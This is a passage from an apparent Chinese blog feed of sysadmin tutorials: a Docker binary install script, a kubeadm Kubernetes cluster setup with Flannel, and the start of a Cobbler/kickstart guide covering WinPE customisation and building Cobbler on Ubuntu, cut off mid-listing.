class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>   <span class="hljs-keyword">fi</span><br>   <br>   <span class="hljs-keyword">if</span> [ $? != 0 ];<span class="hljs-keyword">then</span><br>     <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>     <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不好意思，由于网络波动原因，无法下载<span class="hljs-variable">$&#123;DOCKER_COMPOSE_URL&#125;</span>软件包，程序已退出!请稍后再试......&quot;</span><br>     <span class="hljs-built_in">exit</span> 100<br>   <span class="hljs-keyword">fi</span><br><br>   <span class="hljs-comment"># 给脚本添加执行权限</span><br>   <span class="hljs-built_in">chmod</span> +x <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span><br>&#125;<br><br><br><span class="hljs-comment"># 定义安装函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">InstallDocker</span></span>()&#123;<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS_VERSION</span> == <span class="hljs-string">&quot;centos&quot;</span> ];<span class="hljs-keyword">then</span><br>  [ -f /usr/bin/wget ] || yum -y install wget<br>          rpm -qa |grep bash-completion || yum -y install bash-completion<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$OS_VERSION</span> == <span class="hljs-string">&quot;ubuntu&quot;</span> ];<span class="hljs-keyword">then</span><br>  [ -f /usr/bin/wget ] || apt -y install wget<br><span class="hljs-keyword">fi</span><br><br>    <span class="hljs-comment"># 判断文件是否存在，若不存在则下载软件包</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> ]; <span class="hljs-keyword">then</span><br>       wget <span class="hljs-variable">$&#123;URL&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> -O <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span><br>    <span class="hljs-keyword">fi</span><br>    <br>    <span class="hljs-comment"># 判断安装路径是否存在</span><br>    <span class="hljs-keyword">if</span> [ ! -d <span class="hljs-variable">$&#123;BASE_DIR&#125;</span> ]; <span class="hljs-keyword">then</span><br>      install -d <span class="hljs-variable">$&#123;BASE_DIR&#125;</span><br>    <span class="hljs-keyword">fi</span><br>    <br>    <span class="hljs-comment"># 解压软件包到安装目录</span><br>    tar xf <span class="hljs-variable">$&#123;DOWNLOAD&#125;</span>/<span class="hljs-variable">$&#123;FILENAME&#125;</span> -C <span class="hljs-variable">$&#123;BASE_DIR&#125;</span><br> <br>    <span class="hljs-comment"># 安装docker-compose</span><br>    prepare<br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/<span class="hljs-variable">$&#123;DOCKER_COMPOSE_FILE&#125;</span> <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker/docker-compose<br>   <br>    <span class="hljs-comment"># 创建软连接</span><br>    <span class="hljs-built_in">ln</span> -svf <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker/* /usr/bin/<br>    <br>    <span class="hljs-comment"># 自动补全功能</span><br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/docker /usr/share/bash-completion/completions/docker<br>    <span class="hljs-built_in">source</span> /usr/share/bash-completion/completions/docker<br>    <br>    <span class="hljs-comment"># 配置镜像加速</span><br>    install -d /etc/docker<br>    <span class="hljs-built_in">cp</span> <span class="hljs-variable">$DOWNLOAD</span>/daemon.json /etc/docker/daemon.json<br>    <br>    <span class="hljs-comment"># 开机自启动脚本</span><br>    <span class="hljs-built_in">cp</span> download/docker.service /usr/lib/systemd/system/docker.service<br>    systemctl daemon-reload<br>    systemctl <span class="hljs-built_in">enable</span> --now docker<br>    docker version<br>    docker-compose version<br>    tput setaf 3<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;安装成功,欢迎使用cherry二进制docker安装脚本，欢迎下次使用!&quot;</span><br>    tput setaf 2<br>&#125;<br><br><br><span class="hljs-comment"># 卸载docker</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">UninstallDocker</span></span>()&#123;<br>  <span class="hljs-comment"># 停止docker服务</span><br>  systemctl <span class="hljs-built_in">disable</span> --now docker<br><br>  <span class="hljs-comment"># 卸载启动脚本</span><br>  <span class="hljs-built_in">rm</span> -f /usr/lib/systemd/system/docker.service<br><br>  <span class="hljs-comment"># 清空程序目录</span><br>  <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$&#123;BASE_DIR&#125;</span>/docker<br><br>  <span class="hljs-comment"># 清空数据目录</span><br>  <span class="hljs-built_in">rm</span> -rf /var/lib/&#123;docker,containerd&#125; <br><br>  <span class="hljs-comment"># 清除符号链接</span><br>  <span class="hljs-built_in">rm</span> -f /usr/bin/&#123;containerd,containerd-shim,containerd-shim-runc-v2,ctr,docker,dockerd,docker-init,docker-proxy,runc&#125;<br><br>  <span class="hljs-comment"># 使得终端变粉色</span><br>  tput setaf 5<br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;卸载成功,欢迎再次使用cherry二进制docker安装脚本哟~&quot;</span><br>  tput setaf 7<br>&#125;<br><br><br><span class="hljs-comment"># 程序的入口函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">main</span></span>()&#123;<br>   <span class="hljs-comment"># 判断传递的参数</span><br>   <span class="hljs-keyword">case</span> <span class="hljs-variable">$1</span> <span class="hljs-keyword">in</span><br>     install|i)<br>      InstallDocker<br>      ;;<br>      remove|r)<br>      UninstallDocker<br>      ;;<br>     *)<br>       <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid parameter, Usage: <span class="hljs-variable">$0</span> install|remove&quot;</span><br>       ;;<br>   <span class="hljs-keyword">esac</span><br>&#125;<br><br><span class="hljs-comment"># 向入口函数传参</span><br>main <span class="hljs-variable">$1</span> <br><br>[root@master231 docker]# ll<br>total 16<br>drwxr-xr-x 3 root root 4096 Dec 10 05:49 ./<br>drwx------ 6 root root 4096 Dec 10 05:49 ../<br>drwxr-xr-x 2 root root 4096 May  9  2024 download/<br>-rwxr-xr-x 1 root root 3497 Dec 10 05:49 install-docker.sh*<br><br>2.安装docker<br>[root@master231 docker]# ./install-docker.sh install<br><span class="hljs-string">&#x27;/usr/bin/containerd&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/containerd-shim&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd-shim&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/containerd-shim-runc-v2&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/containerd-shim-runc-v2&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/ctr&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/ctr&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-compose&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-compose&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/dockerd&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/dockerd&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-init&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-init&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/docker-proxy&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/docker-proxy&#x27;</span><br><span class="hljs-string">&#x27;/usr/bin/runc&#x27;</span> -&gt; <span class="hljs-string">&#x27;/softwares/docker/runc&#x27;</span><br>Created symlink /etc/systemd/system/multi-user.target.wants/docker.service → /lib/systemd/system/docker.service.<br>Client:<br> Version:           20.10.24<br> API version:       1.41<br> Go version:        go1.19.7<br> Git commit:        297e128<br> Built:             Tue Apr  4 18:17:06 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server: Docker Engine - Community<br> Engine:<br>  Version:          20.10.24<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.19.7<br>  Git commit:       5d6db84<br>  Built:            Tue Apr  4 18:23:02 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.20<br>  GitCommit:        2806fc1057397dbaeefbea0e4e17bddfbd388f38<br> runc:<br>  Version:          1.1.5<br>  GitCommit:        v1.1.5-0-gf19387a6<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        de40ad0<br>Docker Compose version v2.23.0<br>安装成功,欢迎使用cherry二进制docker安装脚本，欢迎下次使用!<br></code></pre></td></tr></table></figure><h5 id="初始化master组件"><a href="#初始化master组件" class="headerlink" title="初始化master组件"></a>初始化master组件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@master231 ~]# docker load -i master-1.23.17.tar.gz<br><br>2.使用kubeadm初始化master节点<br>[root@master231 ~]# kubeadm init --kubernetes-version=v1.23.17 --image-repository registry.aliyuncs.com/google_containers  --pod-network-cidr=10.100.0.0/16 --service-cidr=10.200.0.0/16  --service-dns-domain=cherry.com<br><span class="hljs-comment">#这个要记住，添加节点需要用</span><br>kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br>--------------------------------------------------<br><br>3.拷贝授权文件，用于管理K8S集群<br>[root@master231 ~]# <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br>[root@master231 ~]# <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br>[root@master231 ~]# <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br><br>4.查看集群节点<br>[root@master231 ~]# kubectl get cs<br>Warning: v1 ComponentStatus is deprecated <span class="hljs-keyword">in</span> v1.19+<br>NAME                 STATUS    MESSAGE                         ERROR<br>scheduler            Healthy   ok                              <br>controller-manager   Healthy   ok                              <br>etcd-0               Healthy   &#123;<span class="hljs-string">&quot;health&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<span class="hljs-string">&quot;reason&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125; <br>[root@master231 ~]# <br>[root@master231 ~]# <br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS     ROLES                  AGE    VERSION<br>master231   NotReady   control-plane,master   117s   v1.23.1<br></code></pre></td></tr></table></figure><h5 id="部署worler组件，添加节点"><a href="#部署worler组件，添加节点" class="headerlink" title="部署worler组件，添加节点"></a>部署worler组件，添加节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@worker232 ~]# docker load  -i slave-1.23.17.tar.gz<br>[root@worker233 ~]# docker load  -i slave-1.23.17.tar.gz<br><br>2.在worker节点输入刚刚的token<br>[root@worker232 ~]# kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br><br>[root@worker232 ~]# kubeadm <span class="hljs-built_in">join</span> 10.0.0.231:6443 --token lzphw7.kc4iu4k0mswnpy7h \<br>--discovery-token-ca-cert-hash sha256:298393d4dc931d6d13ec2ec1aedd4295bcd143a84e78dfc5a82ec7e53210d511<br><br>3.master节点检查集群的worker节点列表<br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS     ROLES                  AGE     VERSION<br>master231   NotReady   control-plane,master   13m     v1.23.17<br>worker232   NotReady   &lt;none&gt;                 3m19s   v1.23.17<br>worker233   NotReady   &lt;none&gt;                 2m3s    v1.23.17<br></code></pre></td></tr></table></figure><h5 id="部署CNI插件，打通网络"><a href="#部署CNI插件，打通网络" class="headerlink" title="部署CNI插件，打通网络"></a>部署CNI插件，打通网络</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.导入镜像<br>[root@master231 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br>[root@master232 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br>[root@master233 ~]# docker load  -i flannel-cni-plugin-v1.5.1.tar.gz<br><br>[root@worker231 ~]# docker load -i flannel.tar.gz<br>[root@worker232 ~]# docker load -i flannel.tar.gz<br>[root@worker233 ~]# docker load -i flannel.tar.gz<br><br><br>2.下载Flannel组件<br>[root@master231 ~]# wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml<br><br>3.安装Flannel组件<br>[root@master231 ~]# kubectl apply -f kube-flannel.yml <br><br>4.查看版本，版本要一致不然会启动失败<br>[root@master231 ~]# grep image kube-flannel.yml<br><br>5.检查falnnel各组件是否安装成功<br>[root@master231 ~]# kubectl get pods -o wide -n kube-flannel <br>NAME                    READY   STATUS    RESTARTS   AGE   IP           NODE        NOMINATED NODE   READINESS GATES<br>kube-flannel-ds-ckkbk   1/1     Running   0          35s   10.0.0.233   worker233   &lt;none&gt;           &lt;none&gt;<br>kube-flannel-ds-kst7g   1/1     Running   0          35s   10.0.0.232   worker232   &lt;none&gt;           &lt;none&gt;<br>kube-flannel-ds-ljktm   1/1     Running   0          35s   10.0.0.231   master231   &lt;none&gt;           &lt;none&gt;<br><br>6.测试各节点组件<br>[root@master231 ~]# kubectl get nodes<br>NAME        STATUS   ROLES                  AGE   VERSION<br>master231   Ready    control-plane,master   37m   v1.23.17<br>worker232   Ready    &lt;none&gt;                 27m   v1.23.17<br>worker233   Ready    &lt;none&gt;                 26m   v1.23.17<br><br></code></pre></td></tr></table></figure><h3 id="五、安装kubectl工具自动补全功能"><a href="#五、安装kubectl工具自动补全功能" class="headerlink" title="五、安装kubectl工具自动补全功能"></a>五、安装kubectl工具自动补全功能</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.临时补全生效<br>apt -y install bash-completion<br><span class="hljs-built_in">source</span> /usr/share/bash-completion/bash_completion<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br>2.永久补全生效需要写入环境变量<br>[root@master231 ~]# vim .bashrc <br>...<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br></code></pre></td></tr></table></figure><h3 id="六、修改时区"><a href="#六、修改时区" class="headerlink" title="六、修改时区"></a>六、修改时区</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改时区<br>[root@master231 ~]# <span class="hljs-built_in">ln</span> -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime <br><br>2.验证<br>[root@master231 ~]# <span class="hljs-built_in">date</span> -R<br></code></pre></td></tr></table></figure><h3 id="七、k8s基础巡检"><a href="#七、k8s基础巡检" class="headerlink" title="七、k8s基础巡检"></a>七、k8s基础巡检</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.检查K8S集群的worker节点列表<br>[root@master231 ~]# kubectl get nodes <br><br>2.检查master组件<br>[root@master231 ~]# kubectl get cs<br><br>3.检查flannel网卡是否正常<br>[root@master231 ~]# kubectl get pods -o wide -n kube-flannel<br><br>4.检查各节点网卡<br>ifconfig <br><br>- 如果有节点没有cni0网卡，建议大家手动创建相应的网桥设备，但是注意网段要一致:<br>1.假设 master231的flannel.1是10.100.0.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.0.1/24 dev cni0<br><br>2.假设 worker232的flannel.1是10.100.1.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.1.1/24 dev cni0<br><br>3.假设 worker233的flannel.1是10.100.2.0网段。<br>ip <span class="hljs-built_in">link</span> add cni0 <span class="hljs-built_in">type</span> bridge<br>ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> dev cni0 up<br>ip addr add 10.100.2.1/24 dev cni0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CICD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CICD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobbler+kickstart实现批量全自动装机</title>
    <link href="/2025/04/16/Cobbler-kickstart%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%85%A8%E8%87%AA%E5%8A%A8%E8%A3%85%E6%9C%BA/"/>
    <url>/2025/04/16/Cobbler-kickstart%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%85%A8%E8%87%AA%E5%8A%A8%E8%A3%85%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><strong>cobbler简介</strong><br>　　cobbler 是一个系统启动服务boot server,可以通过pxe得方式用来快速安装，重装系统，支持安装不同linux发行版和windows。这个工具是用python开发，方便小巧，15k行代码，使用简单得命令完成pxe网络安装环境配置，还可以管理dhcp，dns，yum包镜像。cobbler可以命令行，也可以web（cobbler-web）,还提供api接口，可以方便二次开发使用。其实就是多安装树的pxe环境，是pxe的高级应用</p><p><strong>cobbler支持的功能</strong><br>       1、pxe支持</p><p>　　2、dhcp管理</p><p>　　3、dns服务管理（bind，dnsmasq）</p><p>　　4、电源管理</p><p>　　5、kickstart支持</p><p>　　6、yum仓库管理</p><p>　　7、tftp（pxe启动时需要）</p><p>　　8、apache，提供ks得安装源，并提供定制化得ks配置，同时，它和apache做了深度整合，通过cobbler，可以师兄redhat&#x2F;centos&#x2F;fedora系统得快速部署，同时也支持suse、debian（ubuntu）系统，通过配置开可以支持windows</p><p><strong>cobbler架构及工作原理、核心框架</strong><br><strong>cobbler工作原理</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f7d7868539934ab9b74ae6fbe7762862.png" alt="在这里插入图片描述"><br>cobbler框架<br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8ebcfa6d523145e8afdc6f9cac9be923.png" alt="在这里插入图片描述"><br>介绍一下profile核心，由三个组件组成</p><ul><li>repositories （安装树或安装源）<br>mirror 镜像，光盘或者网络中得安装源<br> import 导入</li><li>distribution（vmlinuz-内核，initrd.img-引导映像文件）<br>cobbler 自动从reporitories抽取出来生成<br> kickstart file 组成得完完整整得系统发行版</li></ul><p>cobbler就是较早pxe的升级版，优点容易配置，还自带web界面比较易于管理，但是中文资料少，（有人测试：cobbler不会应为在局域网中启动了dhcp而导致有些机器因为默认从pxe启动在重启服务器后加载tftp内容导致启动终止，这部分没有验证）</p><p>可以通过cobbler自动部署dhcp，tftp，http，在安装过程中加载ks无人值守安装应答文件实现无人值守，从客户端使用pxe引导启动安装</p><h2 id="一、准备Windows的ADK和win-PE"><a href="#一、准备Windows的ADK和win-PE" class="headerlink" title="一、准备Windows的ADK和win PE"></a>一、准备Windows的ADK和win PE</h2><p>ADK下载地址：<a href="https://go.microsoft.com/fwlink/?linkid=2026036">https://go.microsoft.com/fwlink/?linkid=2026036</a></p><p>win PE下载地址：<a href="https://go.microsoft.com/fwlink/?linkid=2022233">https://go.microsoft.com/fwlink/?linkid=2022233</a></p><p>注意，adk 的两个都要下载，这俩都是引导包，真正的安装程序会由这俩软件进行下载。</p><h2 id="二、安装-ADK-和-WinPE"><a href="#二、安装-ADK-和-WinPE" class="headerlink" title="二、安装 ADK 和 WinPE"></a>二、安装 ADK 和 WinPE</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/aebd29209beb5504ca5f1580a2c8acc1.png" alt="img"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/602799dad7b31a1fd665eb8ee22940ac.png" alt="img"></p><p>安装完后，以管理员身份打开部署和映像工具环境</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/175d96b3f6859cb5615d1eaaf152710d.png" alt="img"></p><p>定制 Win 10 PE</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cmd">copype amd64 C:\winpe<br><br>Dism /mount-image /imagefile:C:\winpe\media\sources\boot.wim /index:<span class="hljs-number">1</span> /mountdir:C:\winpe\mount<br><br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">net</span> use z: \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">253</span>\share &gt;&gt; C:\winpe\mount\Windows\System32\startnet.<span class="hljs-built_in">cmd</span><br><span class="hljs-built_in">echo</span> z:\win\setup.exe /unattend:z:\win\win10_x64_bios_auto.xml &gt;&gt; C:\winpe\mount\Windows\System32\startnet.<span class="hljs-built_in">cmd</span><br><br>Dism /unmount-image /mountdir:C:\winpe\mount /commit<br>MakeWinPEMedia /ISO C:\winpe C:\winpe\winpe_win10_amd64.iso<br></code></pre></td></tr></table></figure><ol><li>本地生成 winpe 文件目录</li><li>dism 挂载 winpe 的启动文件到 winpe 的 mount 目录</li><li>将启动命令硬编码写死到 winpe 的 startnet.cmd 文件里</li><li>无人值守安装</li><li>卸载 winpe 的挂载（一定要执行，否则直接强制删除文件夹会出一些稀奇古怪的问题）</li><li>制作 win10 镜像，名为 winpe_win10_amd64.iso</li></ol><h2 id="三、乌班图安装Cobbler"><a href="#三、乌班图安装Cobbler" class="headerlink" title="三、乌班图安装Cobbler"></a>三、乌班图安装Cobbler</h2><p><code>乌班图安装需要编译安装，建议使用centos安装</code></p><p>安装Apache</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# apt update<br>[root@node1.local ~]# apt install apache2<br></code></pre></td></tr></table></figure><p>启用所需的 Apache 模块</p><p>使用 <code>a2enmod</code> 来启用 <code>proxy</code>、<code>proxy_http</code> 和 <code>rewrite</code> 模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">a2enmod proxy<br>a2enmod proxy_http<br>a2enmod rewrite<br></code></pre></td></tr></table></figure><p>检查是否正确启用模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">apache2ctl -M | grep proxy<br><br>proxy_module (shared)<br>proxy_http_module (shared)<br></code></pre></td></tr></table></figure><p>创建 TFTP 根目录的符号链接</p><p>Cobbler 需要 TFTP 目录来进行 PXE 启动。创建一个符号链接，指向 <code>tftpboot</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# <span class="hljs-built_in">ln</span> -s /srv/tftp /var/lib/tftpboot<br></code></pre></td></tr></table></figure><p>重新启动 Apache 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# systemctl restart apache2<br></code></pre></td></tr></table></figure><p>查看服务状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# systemctl status apache2<br></code></pre></td></tr></table></figure><p>构建 <code>.deb</code> 包</p><p>下载 Cobbler 源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# git <span class="hljs-built_in">clone</span> https://github.com/cobbler/cobbler.git<br>[root@node1.local ~]# <span class="hljs-built_in">cd</span> cobbler<br></code></pre></td></tr></table></figure><p>安装 <code>debuild</code> 和其他构建工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local cobbler]# apt update<br>[root@node1.local cobbler]# apt install devscripts build-essential fakeroot debhelper<br></code></pre></td></tr></table></figure><p>构建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local cobbler]# make debs<br></code></pre></td></tr></table></figure><p>查看构建包位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# find ~ -iname <span class="hljs-string">&#x27;*.deb&#x27;</span><br>/root/cobbler/deb-build/cobbler-tests-containers_3.4.0_all.deb<br>/root/cobbler/deb-build/cobbler_3.4.0_all.deb<br>/root/cobbler/deb-build/cobbler-tests_3.4.0_all.deb<br>/root/cobbler-tests-containers_3.4.0_all.deb<br>/root/cobbler_3.4.0_all.deb<br>/root/cobbler-tests_3.4.0_all.deb<br><br></code></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# dpkg -i /root/cobbler_3.4.0_all.deb<br><br><span class="hljs-comment">#安装的时候会提示以下缺少依赖</span><br>fence-agents<br>xorriso<br>python3-gunicorn<br>python3-pymong<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 